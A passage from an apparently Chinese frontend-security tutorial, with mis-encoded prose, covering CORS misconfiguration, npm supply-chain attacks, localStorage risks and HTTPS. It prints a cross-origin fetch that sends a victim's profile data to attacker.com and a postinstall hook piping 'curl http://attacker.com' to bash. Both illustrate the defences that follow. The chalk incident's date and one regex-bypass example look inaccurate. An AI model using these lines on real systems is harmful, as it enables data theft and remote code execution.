<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ”»å‡»è€…ç½‘ç«™ (evil.com)</span>
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://api.target.com/user/profile'</span>, {
  <span class="hljs-attr">credentials</span>: <span class="hljs-string">'include'</span>  <span class="hljs-comment">// å¸¦ä¸Š cookie</span>
})
.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">json</span>())
.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> {
  <span class="hljs-comment">// æ‹¿åˆ°ç”¨æˆ·æ•æ„Ÿä¿¡æ¯ï¼Œå‘é€ç»™æ”»å‡»è€…æœåŠ¡å™¨</span>
  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://attacker.com/steal'</span>, {
    <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data)
  });
});
</code></pre>
<p>å› ä¸ºå“åº”å¤´å…è®¸ä»»æ„ Origin å¹¶ä¸”å…è®¸æºå¸¦å‡­è¯ï¼Œæ”»å‡»è€…å¯ä»¥è½»æ¾çªƒå–ç”¨æˆ·æ•°æ®ã€‚</p>
<h3 data-id="heading-11">å®‰å…¨é…ç½®</h3>
<p><strong>1. ç™½åå•éªŒè¯</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> allowedOrigins = [
  <span class="hljs-string">'https://myapp.com'</span>,
  <span class="hljs-string">'https://admin.myapp.com'</span>,
  <span class="hljs-string">'https://mobile.myapp.com'</span>
];

app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> origin = req.<span class="hljs-property">headers</span>.<span class="hljs-property">origin</span>;
  <span class="hljs-keyword">if</span> (allowedOrigins.<span class="hljs-title function_">includes</span>(origin)) {
    res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Allow-Origin'</span>, origin);
    res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Allow-Credentials'</span>, <span class="hljs-string">'true'</span>);
  }
  <span class="hljs-title function_">next</span>();
});
</code></pre>
<p><strong>2. æ­£åˆ™åŒ¹é…ï¼ˆè°¨æ…ä½¿ç”¨ï¼‰</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> allowedOriginPattern = <span class="hljs-regexp">/^https:\/\/.*\.myapp\.com$/</span>;

app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> origin = req.<span class="hljs-property">headers</span>.<span class="hljs-property">origin</span>;
  <span class="hljs-keyword">if</span> (origin &amp;&amp; allowedOriginPattern.<span class="hljs-title function_">test</span>(origin)) {
    res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Allow-Origin'</span>, origin);
    res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Allow-Credentials'</span>, <span class="hljs-string">'true'</span>);
  }
  <span class="hljs-title function_">next</span>();
});
</code></pre>
<p>æ³¨æ„æ­£åˆ™è¦ä¸¥æ ¼ï¼Œé¿å…è¢«ç»•è¿‡ã€‚æ¯”å¦‚ <code>/\.myapp\.com$/</code> å¯ä»¥è¢« <code>evil.com.myapp.com</code> ç»•è¿‡ã€‚</p>
<p><strong>3. é™åˆ¶å…è®¸çš„æ–¹æ³•å’Œå¤´</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Allow-Methods'</span>, <span class="hljs-string">'GET, POST, PUT, DELETE'</span>);
res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Allow-Headers'</span>, <span class="hljs-string">'Content-Type, Authorization'</span>);
res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Access-Control-Max-Age'</span>, <span class="hljs-string">'86400'</span>);  <span class="hljs-comment">// é¢„æ£€è¯·æ±‚ç¼“å­˜ 24 å°æ—¶</span>
</code></pre>
<p><strong>CORS å®‰å…¨åŸåˆ™</strong>ï¼š</p>
<ul>
<li>ä¸è¦ç”¨é€šé…ç¬¦ <code>*</code>ï¼ˆè€Œä¸” <code>*</code> å’Œ <code>credentials: true</code> ä¸èƒ½åŒæ—¶ç”¨ï¼‰</li>
<li>ä¸è¦åŠ¨æ€åå°„ Origin è€Œä¸éªŒè¯</li>
<li>ç™½åå•è¦ç²¾ç¡®åˆ°åè®®+åŸŸå+ç«¯å£</li>
<li>é™åˆ¶å…è®¸çš„ HTTP æ–¹æ³•</li>
<li>æ•æ„Ÿæ¥å£ä¸è¦å¼€å¯ CORSï¼Œæˆ–è€…ä¸¥æ ¼é™åˆ¶ Origin</li>
</ul>
<hr/>
<h2 data-id="heading-12">ä¾èµ–å®‰å…¨ï¼šä¾›åº”é“¾æ”»å‡»</h2>
<p>npm ç”Ÿæ€æœ‰ä¸ªé—®é¢˜ï¼šå®‰è£…ä¸€ä¸ªåŒ…ä¼šå¼•å…¥ 79 ä¸ªç¬¬ä¸‰æ–¹ä¾èµ–å’Œ 39 ä¸ªç»´æŠ¤è€…çš„éšå¼ä¿¡ä»»ã€‚å¦‚æœæŸä¸ªä¾èµ–è¢«æ”»å‡»è€…æ§åˆ¶ï¼Œä½ çš„é¡¹ç›®å°±å±é™©äº†ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    subgraph ä½ çš„é¡¹ç›®
        A[package.json]
    end

    subgraph ç›´æ¥ä¾èµ–
        B[lodash]
        C[axios]
    end

    subgraph é—´æ¥ä¾èµ–
        D[follow-redirects]
        E[form-data]
        F[...]
    end

    A --&gt; B
    A --&gt; C
    C --&gt; D
    C --&gt; E
    D --&gt; F

    style F fill:#ff6b6b,color:#fff
    G[æ”»å‡»è€…æ§åˆ¶çš„åŒ…] -.-&gt;|æ›¿æ¢/å…¥ä¾µ| F
</code></pre>
<h3 data-id="heading-13">çœŸå®æ¡ˆä¾‹</h3>
<p><strong>2024 å¹´ chalk æ”»å‡»äº‹ä»¶</strong></p>
<p>æ”»å‡»è€…é€šè¿‡é’“é±¼é‚®ä»¶å…¥ä¾µäº†çŸ¥ååŒ… <code>chalk</code> çš„ç»´æŠ¤è€…è´¦å·ï¼Œç¯¡æ”¹äº†ä»£ç ã€‚<code>chalk</code> æ¯å‘¨ä¸‹è½½é‡è¶… 2 äº¿æ¬¡ï¼Œå½±å“é¢å·¨å¤§ã€‚æ¶æ„ä»£ç ä¼šåœ¨æµè§ˆå™¨ç«¯æ‰§è¡Œï¼ŒåŠ«æŒåŠ å¯†è´§å¸é’±åŒ…äº¤æ˜“ã€‚è™½ç„¶ 2.5 å°æ—¶åå°±è¢«å‘ç°å¹¶æ’¤å›ï¼Œä½†å·²ç»æœ‰ä¸å°‘é¡¹ç›®ä¸­æ‹›ã€‚</p>
<p>åŒæ—¶è¢«æ”»å‡»çš„è¿˜æœ‰ <code>debug</code>ã€<code>ansi-styles</code> ç­‰ 18 ä¸ªçƒ­é—¨åŒ…ï¼Œæ€»ä¸‹è½½é‡è¶… 20 äº¿æ¬¡/å‘¨ã€‚</p>
<h3 data-id="heading-14">å¸¸è§æ”»å‡»æ‰‹æ³•</h3>
<p><strong>1. ä¾èµ–æ··æ·†</strong></p>
<p>å…¬å¸å†…éƒ¨ç”¨ç§æœ‰ npm æºï¼ŒåŒ…åå« <code>@company/utils</code>ã€‚æ”»å‡»è€…åœ¨å…¬å…± npm ä¸Šæ³¨å†ŒåŒååŒ…ï¼Œå¦‚æœé…ç½®ä¸å½“ï¼Œnpm å¯èƒ½ä¼˜å…ˆå®‰è£…å…¬å…±æºçš„æ¶æ„åŒ…ã€‚</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ”»å‡»è€…æ³¨å†Œå…¬å…±åŒ…</span>
npm publish @company/utils

<span class="hljs-comment"># å…¬å¸å†…éƒ¨å®‰è£…æ—¶ï¼Œå¦‚æœæ²¡æ­£ç¡®é…ç½®ï¼Œå¯èƒ½è£…åˆ°æ¶æ„åŒ…</span>
npm install @company/utils
</code></pre>
<p><strong>2. æ¶æ„å®‰è£…è„šæœ¬</strong></p>
<p>npm åŒ…å¯ä»¥åœ¨ <code>package.json</code> é‡Œå®šä¹‰å®‰è£…è„šæœ¬ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"preinstall"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"node malicious.js"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"postinstall"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"curl http://attacker.com | bash"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>ä¸€ <code>npm install</code>ï¼Œè„šæœ¬å°±æ‰§è¡Œäº†ã€‚å¯ä»¥çªƒå–ç¯å¢ƒå˜é‡ã€æºç ã€å¯†é’¥ç­‰ã€‚</p>
<p><strong>3. Typosquattingï¼ˆé”™åˆ«å­—æ”»å‡»ï¼‰</strong></p>
<p>æ³¨å†Œä¸çŸ¥ååŒ…ç›¸ä¼¼çš„åå­—ï¼Œç­‰äººæ‰“é”™å­—ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ­£ç¡®çš„åŒ…</span>
npm install lodash

<span class="hljs-comment"># æ”»å‡»è€…æ³¨å†Œçš„æ¶æ„åŒ…</span>
npm install loadash  <span class="hljs-comment"># å°‘ä¸ª d</span>
npm install lodahs   <span class="hljs-comment"># h å’Œ s ä½ç½®åäº†</span>
</code></pre>
<h3 data-id="heading-15">é˜²å¾¡ä¾›åº”é“¾æ”»å‡»</h3>
<p><strong>1. é”å®šä¾èµ–ç‰ˆæœ¬</strong></p>
<p>ç”¨ <code>package-lock.json</code> æˆ– <code>yarn.lock</code> å›ºå®šä¾èµ–ç‰ˆæœ¬ï¼Œé˜²æ­¢è‡ªåŠ¨å‡çº§å¼•å…¥æ¶æ„ä»£ç ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// package.json - ç²¾ç¡®ç‰ˆæœ¬ï¼Œä¸è¦ç”¨ ^ æˆ– ~</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"lodash"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"4.17.21"</span><span class="hljs-punctuation">,</span>    <span class="hljs-comment">// ç²¾ç¡®ç‰ˆæœ¬</span>
    <span class="hljs-attr">"axios"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1.6.2"</span>        <span class="hljs-comment">// ä¸ç”¨ ^1.6.2 æˆ– ~1.6.2</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>å¹¶ä¸”æäº¤ <code>package-lock.json</code> åˆ°ä»£ç ä»“åº“ã€‚</p>
<p><strong>2. ä½¿ç”¨ npm ci</strong></p>
<p>CI/CD æµç¨‹ä¸­ç”¨ <code>npm ci</code> è€Œä¸æ˜¯ <code>npm install</code>ï¼Œç¡®ä¿ä¸¥æ ¼æŒ‰ç…§ lock æ–‡ä»¶å®‰è£…ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># CI è„šæœ¬</span>
npm ci              <span class="hljs-comment"># ä¸¥æ ¼æŒ‰ lock æ–‡ä»¶å®‰è£…</span>
npm run build
npm <span class="hljs-built_in">test</span>
</code></pre>
<p><code>npm ci</code> çš„ç‰¹ç‚¹ï¼š</p>
<ul>
<li>åˆ é™¤ <code>node_modules</code> é‡æ–°å®‰è£…</li>
<li>ä¸¥æ ¼æŒ‰ lock æ–‡ä»¶ï¼Œä¸ä¼šä¿®æ”¹å®ƒ</li>
<li>å¦‚æœ lock æ–‡ä»¶å’Œ package.json ä¸ä¸€è‡´ä¼šæŠ¥é”™</li>
</ul>
<p><strong>3. å®šæœŸå®¡è®¡ä¾èµ–</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># npm å†…ç½®å®¡è®¡</span>
npm audit
npm audit fix       <span class="hljs-comment"># è‡ªåŠ¨ä¿®å¤</span>

<span class="hljs-comment"># æˆ–è€…ç”¨ç¬¬ä¸‰æ–¹å·¥å…·</span>
npx snyk <span class="hljs-built_in">test</span>       <span class="hljs-comment"># Snyk</span>
npx socket security <span class="hljs-comment"># Socket</span>
</code></pre>
<p>è®¾ç½® CI è‡ªåŠ¨æ£€æŸ¥ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># GitHub Actions</span>
<span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Security</span> <span class="hljs-string">audit</span>
  <span class="hljs-attr">run:</span> <span class="hljs-string">npm</span> <span class="hljs-string">audit</span> <span class="hljs-string">--audit-level=moderate</span>
</code></pre>
<p><strong>4. ç¦ç”¨å®‰è£…è„šæœ¬</strong></p>
<p>å¦‚æœä¸éœ€è¦è¿è¡Œå®‰è£…è„šæœ¬ï¼Œå¯ä»¥ç¦ç”¨ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">npm install --ignore-scripts
</code></pre>
<p>åœ¨ <code>.npmrc</code> é‡Œå…¨å±€è®¾ç½®ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">ignore-scripts</span>=<span class="hljs-literal">true</span>
</code></pre>
<p>éœ€è¦è¿è¡Œè„šæœ¬æ—¶æ‰‹åŠ¨æ‰§è¡Œï¼š</p>
<pre><code class="hljs language-bash" lang="bash">npm rebuild
</code></pre>
<p><strong>5. ç§æœ‰æº + ç™½åå•</strong></p>
<p>å…¬å¸å†…éƒ¨æ­å»ºç§æœ‰ npm æºï¼ˆå¦‚ Verdaccioï¼‰ï¼Œåªå…è®¸å®¡æ ¸è¿‡çš„åŒ…è¿›å…¥ã€‚é…åˆ <code>@scope</code> å‘½åç©ºé—´ä½¿ç”¨ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// .npmrc</span>
@company<span class="hljs-punctuation">:</span>registry=https<span class="hljs-punctuation">:</span><span class="hljs-comment">//npm.company.com</span>
registry=https<span class="hljs-punctuation">:</span><span class="hljs-comment">//registry.npmjs.org</span>
</code></pre>
<p>è¿™æ · <code>@company/</code> å¼€å¤´çš„åŒ…èµ°ç§æœ‰æºï¼Œå…¶ä»–åŒ…èµ°å…¬å…±æºã€‚</p>
<p><strong>6. æ£€æŸ¥ä¾èµ–å®Œæ•´æ€§</strong></p>
<p>ä½¿ç”¨ Subresource Integrityï¼ˆSRIï¼‰éªŒè¯ CDN èµ„æºï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>
  <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.example.com/library.js"</span>
  <span class="hljs-attr">integrity</span>=<span class="hljs-string">"sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"</span>
  <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">"anonymous"</span>
&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>å¦‚æœ CDN èµ„æºè¢«ç¯¡æ”¹ï¼Œæµè§ˆå™¨ä¼šæ‹’ç»åŠ è½½ã€‚</p>
<p><strong>7. å‡å°‘ä¾èµ–æ•°é‡</strong></p>
<p>å°‘ç”¨ä¾èµ–ã€‚ä¸€ä¸ª <code>left-pad</code> è¿™ç§åŠŸèƒ½è‡ªå·±å†™å‡ è¡Œä»£ç å°±èƒ½æå®šï¼Œæ²¡å¿…è¦å¼•å…¥å¤–éƒ¨åŒ…ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä¸éœ€è¦å®‰è£… left-pad</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">leftPad</span>(<span class="hljs-params">str, len, char = <span class="hljs-string">' '</span></span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">String</span>(char).<span class="hljs-title function_">repeat</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">0</span>, len - <span class="hljs-title class_">String</span>(str).<span class="hljs-property">length</span>)) + str;
}
</code></pre>
<p>æ¯å¤šä¸€ä¸ªä¾èµ–å°±å¤šä¸€ä¸ªé£é™©ç‚¹ã€‚å®šæœŸæ£€æŸ¥ <code>node_modules</code>ï¼Œç§»é™¤ä¸ç”¨çš„åŒ…ã€‚</p>
<p><strong>å·¥å…·æ¨è</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flirantal%2Flockfile-lint" target="_blank" title="https://github.com/lirantal/lockfile-lint" ref="nofollow noopener noreferrer">lockfile-lint</a>ï¼šæ£€æµ‹ lockfile æ˜¯å¦è¢«ç¯¡æ”¹</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnaugtur%2Fnpm-audit-resolver" target="_blank" title="https://github.com/naugtur/npm-audit-resolver" ref="nofollow noopener noreferrer">npm-audit-resolver</a>ï¼šæ›´å¥½çš„æ¼æ´ä¿®å¤å·¥å…·</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fsnyk.io%2F" target="_blank" title="https://snyk.io/" ref="nofollow noopener noreferrer">Snyk</a>ï¼šä¾èµ–å®‰å…¨æ‰«æ</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fsocket.dev%2F" target="_blank" title="https://socket.dev/" ref="nofollow noopener noreferrer">Socket</a>ï¼šå®æ—¶ç›‘æ§ä¾èµ–å˜åŒ–</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdependabot" target="_blank" title="https://github.com/dependabot" ref="nofollow noopener noreferrer">Dependabot</a>ï¼šGitHub è‡ªåŠ¨æ›´æ–°ä¾èµ–çš„å®‰å…¨è¡¥ä¸</li>
</ul>
<hr/>
<h2 data-id="heading-16">æœ¬åœ°å­˜å‚¨å®‰å…¨ï¼šä¸è¯¥æ”¾çš„åˆ«æ”¾</h2>
<p>localStorage å’Œ sessionStorage å¾ˆæ–¹ä¾¿ï¼Œä½†å®ƒä»¬å¯¹ JavaScript å®Œå…¨å¯è§ã€‚åªè¦é¡µé¢æœ‰ XSS æ¼æ´ï¼Œæ”»å‡»è€…å°±èƒ½æŠŠé‡Œé¢çš„ä¸œè¥¿å…¨å·èµ°ã€‚</p>
<h3 data-id="heading-17">ä¸è¦å­˜è¿™äº›</h3>
<ul>
<li><strong>JWT Token</strong>ï¼šæœ€å¸¸è§çš„é”™è¯¯ï¼ŒXSS ä¸€å‘ç”Ÿå°±è¢«å·èµ°</li>
<li><strong>ç”¨æˆ·å¯†ç </strong>ï¼šå³ä½¿åŠ å¯†ä¹Ÿä¸è¦å­˜åœ¨å‰ç«¯</li>
<li><strong>ä¸ªäººæ•æ„Ÿä¿¡æ¯</strong>ï¼šèº«ä»½è¯å·ã€é“¶è¡Œå¡å·ã€æ‰‹æœºå·ç­‰</li>
<li><strong>API å¯†é’¥</strong>ï¼šåº”è¯¥åœ¨åç«¯ç®¡ç†</li>
<li><strong>ä¼šè¯ ID</strong>ï¼šç”¨ HttpOnly Cookie æ›´å®‰å…¨</li>
</ul>
<h3 data-id="heading-18">å¦‚æœéè¦å­˜</h3>
<ol>
<li><strong>è¯„ä¼°é£é™©</strong>ï¼šç¡®è®¤è¿™ä¸ªæ•°æ®æ³„éœ²åçš„å½±å“</li>
<li><strong>åŠ å¯†å­˜å‚¨</strong>ï¼šè™½ç„¶ä¸èƒ½é˜»æ­¢ XSS æ”»å‡»è€…æ‹¿åˆ°å¯†æ–‡ï¼Œä½†è‡³å°‘å¢åŠ ç ´è§£æˆæœ¬</li>
<li><strong>è®¾ç½®è¿‡æœŸæ—¶é—´</strong>ï¼šè‡ªå·±å®ç°è¿‡æœŸæœºåˆ¶ï¼Œå‡å°‘é•¿æœŸæš´éœ²çš„é£é™©</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å°è£…å¸¦è¿‡æœŸæ—¶é—´çš„å­˜å‚¨</span>
<span class="hljs-keyword">const</span> secureStorage = {
  <span class="hljs-title function_">set</span>(<span class="hljs-params">key, value, ttl = <span class="hljs-number">3600000</span></span>) {  <span class="hljs-comment">// é»˜è®¤ 1 å°æ—¶</span>
    <span class="hljs-keyword">const</span> item = {
      value,
      <span class="hljs-attr">expiry</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() + ttl
    };
    <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(key, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(item));
  },

  <span class="hljs-title function_">get</span>(<span class="hljs-params">key</span>) {
    <span class="hljs-keyword">const</span> itemStr = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(key);
    <span class="hljs-keyword">if</span> (!itemStr) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;

    <span class="hljs-keyword">const</span> item = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(itemStr);
    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() &gt; item.<span class="hljs-property">expiry</span>) {
      <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(key);
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
    <span class="hljs-keyword">return</span> item.<span class="hljs-property">value</span>;
  },

  <span class="hljs-title function_">remove</span>(<span class="hljs-params">key</span>) {
    <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(key);
  }
};

<span class="hljs-comment">// ä½¿ç”¨</span>
secureStorage.<span class="hljs-title function_">set</span>(<span class="hljs-string">'tempData'</span>, { <span class="hljs-attr">foo</span>: <span class="hljs-string">'bar'</span> }, <span class="hljs-number">60000</span>);  <span class="hljs-comment">// 1 åˆ†é’Ÿè¿‡æœŸ</span>
<span class="hljs-keyword">const</span> data = secureStorage.<span class="hljs-title function_">get</span>(<span class="hljs-string">'tempData'</span>);
</code></pre>
<h3 data-id="heading-19">æ¨èæ–¹æ¡ˆ</h3>
<p>è®¤è¯ token ä¼˜å…ˆè€ƒè™‘ <strong>HttpOnly Cookie</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// åç«¯è®¾ç½®</span>
res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">'auth_token'</span>, token, {
  <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">true</span>,      <span class="hljs-comment">// JavaScript è®¿é—®ä¸åˆ°</span>
  <span class="hljs-attr">secure</span>: <span class="hljs-literal">true</span>,        <span class="hljs-comment">// åªåœ¨ HTTPS ä¸‹å‘é€</span>
  <span class="hljs-attr">sameSite</span>: <span class="hljs-string">'strict'</span>,  <span class="hljs-comment">// é˜² CSRF</span>
  <span class="hljs-attr">maxAge</span>: <span class="hljs-number">3600000</span>      <span class="hljs-comment">// 1 å°æ—¶è¿‡æœŸ</span>
});

<span class="hljs-comment">// å‰ç«¯å‘è¯·æ±‚æ—¶ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å¸¦ä¸Š cookie</span>
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/user/profile'</span>, {
  <span class="hljs-attr">credentials</span>: <span class="hljs-string">'include'</span>
});
</code></pre>
<p>è¿™æ ·å³ä½¿æœ‰ XSS æ¼æ´ï¼Œæ”»å‡»è€…ä¹Ÿæ‹¿ä¸åˆ° tokenã€‚</p>
<h3 data-id="heading-20">IndexedDB å’Œ Web SQL</h3>
<p>å®ƒä»¬ä¹Ÿæœ‰åŒæ ·çš„é—®é¢˜ï¼ŒJavaScript å¯ä»¥å®Œå…¨è®¿é—®ã€‚ä¸è¦ç”¨æ¥å­˜æ•æ„Ÿæ•°æ®ã€‚</p>
<hr/>
<h2 data-id="heading-21">HTTPSï¼šä¼ è¾“å®‰å…¨çš„åŸºç¡€</h2>
<p>HTTP æ˜¯æ˜æ–‡ä¼ è¾“ï¼Œä¸­é—´äººèƒ½çœ‹åˆ°å’Œä¿®æ”¹æ‰€æœ‰å†…å®¹ã€‚HTTPS ç”¨ TLS/SSL åŠ å¯†ï¼Œæä¾›ä¸‰ä¸ªä¿éšœï¼š</p>
<ol>
<li><strong>å†…å®¹åŠ å¯†</strong>ï¼šä¸­é—´äººçœ‹ä¸åˆ°ä¼ è¾“å†…å®¹</li>
<li><strong>èº«ä»½è®¤è¯</strong>ï¼šç¡®ä¿è®¿é—®çš„æ˜¯çœŸæ­£çš„æœåŠ¡å™¨ï¼Œä¸æ˜¯ä¸­é—´äººä¼ªé€ çš„</li>
<li><strong>æ•°æ®å®Œæ•´æ€§</strong>ï¼šé˜²æ­¢å†…å®¹è¢«ç¯¡æ”¹</li>
</ol>
<h3 data-id="heading-22">HTTPS å·¥ä½œåŸç†</h3>
<p>HTTPS ç”¨çš„æ˜¯æ··åˆåŠ å¯†ï¼š<strong>éå¯¹ç§°åŠ å¯† + å¯¹ç§°åŠ å¯†</strong>ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆä¸å…¨ç”¨éå¯¹ç§°åŠ å¯†ï¼Ÿ</strong></p>
<ul>
<li>éå¯¹ç§°åŠ å¯†å®‰å…¨ä½†æ…¢ï¼ˆRSA åŠ å¯†é€Ÿåº¦æ¯” AES æ…¢ 1000 å€ï¼‰</li>
<li>å¯¹ç§°åŠ å¯†å¿«ä½†ä¸å®‰å…¨ï¼ˆå¯†é’¥æ€ä¹ˆä¼ è¾“ï¼Ÿï¼‰</li>
</ul>
<p>æ‰€ä»¥ç»“åˆä¸¤è€…ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant å®¢æˆ·ç«¯
    participant æœåŠ¡å™¨

    rect rgb(200, 230, 255)
        Note over å®¢æˆ·ç«¯, æœåŠ¡å™¨: æ¡æ‰‹é˜¶æ®µï¼ˆéå¯¹ç§°åŠ å¯†ï¼‰
        å®¢æˆ·ç«¯-&gt;&gt;æœåŠ¡å™¨: 1. è¯·æ±‚HTTPSè¿æ¥
        æœåŠ¡å™¨-&gt;&gt;å®¢æˆ·ç«¯: 2. è¿”å›æ•°å­—è¯ä¹¦(å«å…¬é’¥)
        å®¢æˆ·ç«¯-&gt;&gt;å®¢æˆ·ç«¯: 3. éªŒè¯è¯ä¹¦åˆæ³•æ€§
        å®¢æˆ·ç«¯-&gt;&gt;æœåŠ¡å™¨: 4. ç”Ÿæˆå¯¹ç§°å¯†é’¥ï¼Œç”¨å…¬é’¥åŠ å¯†å‘é€
        æœåŠ¡å™¨-&gt;&gt;æœåŠ¡å™¨: 5. ç”¨ç§é’¥è§£å¯†ï¼Œè·å–å¯¹ç§°å¯†é’¥
    end

    rect rgb(200, 255, 200)
        Note over å®¢æˆ·ç«¯, æœåŠ¡å™¨: ä¼ è¾“é˜¶æ®µï¼ˆå¯¹ç§°åŠ å¯†ï¼‰
        å®¢æˆ·ç«¯-&gt;&gt;æœåŠ¡å™¨: 6. ç”¨å¯¹ç§°å¯†é’¥åŠ å¯†æ•°æ®
        æœåŠ¡å™¨-&gt;&gt;å®¢æˆ·ç«¯: 7. ç”¨å¯¹ç§°å¯†é’¥åŠ å¯†å“åº”
    end
</code></pre>
<ol>
<li>
<p><strong>æ¡æ‰‹é˜¶æ®µï¼ˆéå¯¹ç§°åŠ å¯†ï¼‰</strong>ï¼š</p>
<ul>
<li>å®¢æˆ·ç«¯è¯·æ±‚ HTTPS è¿æ¥</li>
<li>æœåŠ¡å™¨è¿”å›æ•°å­—è¯ä¹¦ï¼ˆåŒ…å«å…¬é’¥ï¼‰</li>
<li>å®¢æˆ·ç«¯éªŒè¯è¯ä¹¦åˆæ³•æ€§</li>
<li>å®¢æˆ·ç«¯ç”Ÿæˆéšæœºå¯¹ç§°å¯†é’¥ï¼Œç”¨æœåŠ¡å™¨å…¬é’¥åŠ å¯†åå‘é€</li>
<li>æœåŠ¡å™¨ç”¨ç§é’¥è§£å¯†ï¼Œæ‹¿åˆ°å¯¹ç§°å¯†é’¥</li>
</ul>
</li>
<li>
<p><strong>æ•°æ®ä¼ è¾“é˜¶æ®µï¼ˆå¯¹ç§°åŠ å¯†ï¼‰</strong>ï¼š</p>
<ul>
<li>åŒæ–¹ç”¨åå•†å¥½çš„å¯¹ç§°å¯†é’¥åŠ å¯†æ‰€æœ‰æ•°æ®</li>
<li>é€Ÿåº¦å¿«ï¼Œå®‰å…¨æ€§ä¹Ÿæœ‰ä¿éšœ</li>
</ul>
</li>
</ol>
<h3 data-id="heading-23">æ•°å­—è¯ä¹¦å¦‚ä½•é˜²æ­¢ä¸­é—´äººæ”»å‡»</h3>
<p>ä¸­é—´äººå¯èƒ½æ‹¦æˆªæœåŠ¡å™¨çš„å…¬é’¥ï¼Œæ›¿æ¢æˆè‡ªå·±çš„ã€‚æ•°å­—è¯ä¹¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼š</p>
<ol>
<li>
